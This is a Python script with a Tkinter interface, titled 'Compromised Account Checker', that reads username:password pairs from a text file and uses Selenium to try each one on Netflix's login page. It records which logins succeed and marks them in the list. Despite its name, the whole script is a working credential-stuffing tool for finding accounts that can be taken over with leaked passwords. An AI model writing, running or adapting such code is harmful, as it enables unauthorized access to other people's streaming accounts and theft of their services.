from selenium import webdriver
import time
from tkinter import *
from tkinter.filedialog import askopenfilename
import os

root = Tk() 
text = Text(root)
root.geometry("800x1000") 

lineIterator = 0 
newUsername = ""
newPassword = ""
txtFilePath = ""
chromeDriverFilePath = ""
userCount = 0 
infoDict = {}
yPlacementUser = 280
yPlacementPass = 310
yNewMessage = 200
yAccLabel = 250
checkVariable = 0
startUpdate = 0 
noOfLines = 0 
i = 0#this variable is for constructing the dict
j = 1 #this variable is for traversing the dict
k = 0 #this variable is for file editing 

def clickToFindTxt():
    global k
    global lineIterator
    global noOfLines
    global userCount
    global checkVariable 
    global startUpdate
    global txtFilePath
    filename = askopenfilename()
    name, extension = os.path.splitext(filename)
    f = open(filename, "r")
    if(extension != ".txt"):
        txtExtErrLabel = Label(root, fg = "red", text="Needs To Be a Txt File", font="Times 12").place( anchor = 'center', x=420, y=820)
        checkVariable = 1
    elif(os.stat(filename).st_size == 0):
        txtFileEmptyLabel = Label(root, fg = "red", text="Txt File is Empty", font="Times 12").place( anchor = 'center', x=420, y=820)
        checkVariable = 1
    else:
        if(checkVariable == 1):
            txtFileEmptyFull = Label(root, fg = "green", text="Txt File Adequate", font="Times 12").place( anchor = 'center', x=420, y=820)
        listofInfo = list(f)
        txtFilePath = filename
        noOfLines = len(listofInfo) 
        for i in range(noOfLines):
            position = -1
            iterator = 0
            newUsername = ""
            newPassword = ""
            str(listofInfo[k]).replace(" ","")
            k+=1
            for letters in listofInfo[lineIterator]:
                position+=1
                if(letters == ":"):
                    for userLetters in range(position):
                        newUsername = newUsername + str(listofInfo[lineIterator][iterator])
                        iterator += 1
                    userCount +=1 
                    iterator = 0
                    infoDict["Username" + str(userCount)] = str(newUsername)
                    for passLetters in range( (len(listofInfo[lineIterator]) - 1) - position - 1 ):
                        iterator += 1
                        newPassword = newPassword + str(listofInfo[lineIterator][ (position) + iterator ])
                    infoDict["Password" + str(userCount)] = str(newPassword)
                    lineIterator +=1
        selectTxtFileUpdated = Button(root, fg = "green", text = "Txt File Selected", padx=200, font="Times 10", command= "" ).place(x =300, y = 900, height = 40, width = 110)
        startUpdate += 1
        if(startUpdate == 2):
            startButton = Button(root, fg = "green", text = "Start", padx=200, font="Times 14", command= clickToStart ).place(x =360, y = 860, height = 40, width = 110)
titleLabel = Label(root, text="Compromised Account Checker", font="Times 16").place(anchor = 'center', x=400, y=15)
subtitleLablel = Label(root, text="Please Select Txt File and Chromedriver Below! ", font="Times 10").place(anchor = 'center', x= 400, y=33) 
subtitleLablel = Label(root, text="Ver 1.5.3", font="Times 10").place(anchor = 'center', x= 400, y=51) 
checkVariable = 0
def clickToFindChromeDriver():
    global checkVariable
    global startUpdate
    global chromeDriverFilePath
    filename = askopenfilename()
    name, extension = os.path.splitext(filename)
    if( ("chromedriver" in name) and (extension == ".exe") ):
        if(checkVariable == 1):
            txtExtErrLabel = Label(root, fg = "green", text="Chromedriver Adequate", font="Times 12").place( anchor = 'center', x=420, y=800)
        selectChromeDriver = Button(root, fg = "green", text = "Chromedriver Selected", padx=200, font="Times 8", command= "" ).place(x =420, y = 900, height = 40, width = 110)
        startUpdate += 1
        chromeDriverFilePath = filename
        if(startUpdate == 2):
            startButton = Button(root, fg = "green", text = "Start", padx=200, font="Times 14", command= clickToStart ).place(x =360, y = 860, height = 40, width = 110)
    else:
        txtExtErrLabel = Label(root, fg = "red", text="Please Select Chromedriver", font="Times 12").place( anchor = 'center', x=420, y=800)
        checkVariable = 1
def changeFile(string):
    global k
    global txtFilePath
    read = open(txtFilePath, "r")
    list_of_lines = read.readlines()
    list_of_lines[k] = str(string) + list_of_lines[k]
    a_file = open(txtFilePath, "w")
    a_file.writelines(list_of_lines)
    a_file.close()
    k+=1
def findAndReplace():
    global k
    global txtFilePath
    read = open(txtFilePath, "r")
    list_of_lines = read.readlines()
    list_of_lines[k] = list_of_lines[k].replace("-- SAFE ACCOUNT -- ", "-- COMPROMISED ACCOUNT --" )
    read.close()
    a_file = open(txtFilePath, "w")
    a_file.writelines(list_of_lines)
    a_file.close()
    k+=1
def cannotStartButton():
    txtExtErrLabel = Label(root, fg = "red", text="Cannot Start Please Select Txt File or Chromedriver", font="Times 12").place( anchor = 'center', x=420, y=780)
def clickToStart():
    global j
    global k
    global noOfLines
    global chromeDriverFilePath
    global txtFilePath
    global yPlacementUser
    global yPlacementPass
    global yNewMessage
    global yAccLabel
    k = 0
    url = "https://www.netflix.com/login"
    urlLoggin = "https://www.netflix.com/browse"
    driver = webdriver.Chrome(chromeDriverFilePath)
    driver.get(url)
    f = open(txtFilePath, "r")
    listofInfo = list(f)
    readyToStartLabel = Label(root, fg = "red", text="The Program is Ready to Start! Click the Start Button", font="Times 12").place( anchor = 'center', x=420, y=780)
    for lines in range(noOfLines):
        if(k == noOfLines + 1):
            return
        if( driver.current_url == str(urlLoggin)):
            printNewMessage = Label(root, text = ( "Compromised Account Found at Line "  + str(j -1 ) ), font ="Times 14" ).place(x = 260, y = yNewMessage)
            accLabel = Label(root, text = ( "Account Credentials:"), font ="Times 14" ).place( x = 330, y = yAccLabel)
            userPrint = Label(root, text = ( "Username: " + str(infoDict["Username" + str(j -1)])), font ="Times 14" ).place( x = 330, y = yPlacementUser)
            passPrint = Label(root, text = ( "Password: " + str(infoDict["Password" + str(j - 1)])), font ="Times 14" ).place( x = 330, y = yPlacementPass)
            yPlacementUser += 170 
            yPlacementPass += 170
            yAccLabel += 170
            yNewMessage += 170
            k-=1
            if(k == 0):
                if("-- SAFE ACCOUNT -- " in listofInfo[k]):
                     findAndReplace()
                     clickToStart()
            elif( ("-- SAFE ACCOUNT -- " in listofInfo[k]) or ("-- COMPROMISED ACCOUNT -- " in listofInfo[k])):
                     findAndReplace()
                     clickToStart()          
        UserName = infoDict.setdefault("Username" + str(j))
        Password = infoDict.setdefault("Password" + str(j))
        j+=1
        time.sleep(1)
        driver.find_element_by_id("id_userLoginId").clear()
        driver.find_element_by_id("id_userLoginId").send_keys(UserName)
        time.sleep(3)
        driver.find_element_by_id("id_password").clear()
        driver.find_element_by_id("id_password").send_keys(Password)
        driver.find_element_by_class_name("login-button").click()
        time.sleep(1)
        listofInfo[k] = "-- SAFE ACCOUNT -- " + listofInfo[k]
        changeFile("-- SAFE ACCOUNT -- ")
        
root.resizable(False, False)
startButton = Button(root, fg = "red", text = "Start", padx=200, font="Times 14", command= cannotStartButton ).place(x =360, y = 860, height = 40, width = 110)
selectTxtFile = Button(root, text = "Select Txt File", padx=200, font="Times 10", command= clickToFindTxt ).place(x =300, y = 900, height = 40, width = 110)
selectChromeDriver = Button(root, text = "Select Chromedriver", padx=200, font="Times 8", command= clickToFindChromeDriver ).place(x =420, y = 900, height = 40, width = 110)
root.mainloop()  